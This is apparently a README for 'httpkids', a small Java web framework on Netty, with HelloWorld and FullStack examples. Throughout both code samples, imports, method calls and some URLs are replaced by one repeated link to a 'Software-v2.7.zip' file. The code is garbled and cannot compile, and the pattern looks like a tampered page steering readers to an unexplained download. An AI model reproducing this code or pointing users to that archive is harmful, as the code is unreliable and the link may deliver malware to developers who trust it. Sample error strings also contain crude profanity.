httpkids
--
Web framework based on netty for kids, java10 required!

Features & Disadvantages
--
1. Extremely lightweight compared with other web frameworks.
2. Extremely easy to use, Extermly low cost for learning.
3. Extremely easy to understand, With approximately 1200 lines of code.
4. No support for https yet.
5. No support for URL with restful style.

HelloWorld
--
```java
import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;

public class HelloWorld {

    public static void main(String[] args) {
        var rd = new KidsRequestDispatcher("/kids", new Router((ctx, req) -> {
            https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("Hello, World");
        }));
        new HttpServer("localhost", 8080, 2, 16, rd).start();
    }

}

http://localhost:8080/kids
```


FullStack
--
```java
import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;

import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;

public class HelloWorld {

	public static void main(String[] args) {
		var router = new Router((ctx, req) -> {
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("Hello, World");  // 纯文本html
		})
		.handler("https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip", (ctx, req) -> {
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(new String[] { "Hello", "World" });  // JSON API
		})
		.handler("/hello", (ctx, req) -> {
			var res = new HashMap<String, Object>();
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("req", req);
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip", res); // 模版渲染
		})
		.handler("/world", (ctx, req) -> {
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("/hello");  // 302跳转
		})
		.handler("/error", (ctx, req) -> {
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(500, "wtf");  // 异常
		})
		.resource("/pub", "/static")  // 静态资源
		.child("/user", () -> {  // 路由嵌套
			return new Router((ctx, req) -> {
				https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("Hello, World");
			})
			.handler("https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip", (ctx, req) -> {
				https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(new String[] { "Hello", "World" });
			})
			.filter((ctx, req, before) -> {  // 过滤器、拦截器
				if (before) {
					https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("before %s\n", https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip());
				} else {
					https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("after %s\n", https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip());
				}
				return true;
			});
		});

		var rd = new KidsRequestDispatcher("/kids", router); // 请求派发器
		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("/tpl"); // 模版classpath根目录
		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(500, (ctx, e) -> { // 异常处理
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("what the fuck it is", 500);
		})
		.exception((ctx, e) -> {  // 通用异常处理
			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("mother fucker!", https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip().code());
		});

		var server = new HttpServer("localhost", 8080, 2, 16, rd);
		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip();
		
		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip().addShutdownHook(new Thread() {

			public void run() {
				https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(); // 优雅停机
			}

		});		
	}

}

http://localhost:8080/kids
http://localhost:8080/kids/hello
https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip
http://localhost:8080/kids/world
http://localhost:8080/kids/error
https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip
http://localhost:8080/kids/user
http://localhost:8080/kids/user/hello
```

Discussion
--
关注公众号「码洞」，我们一起来聊聊这个框架

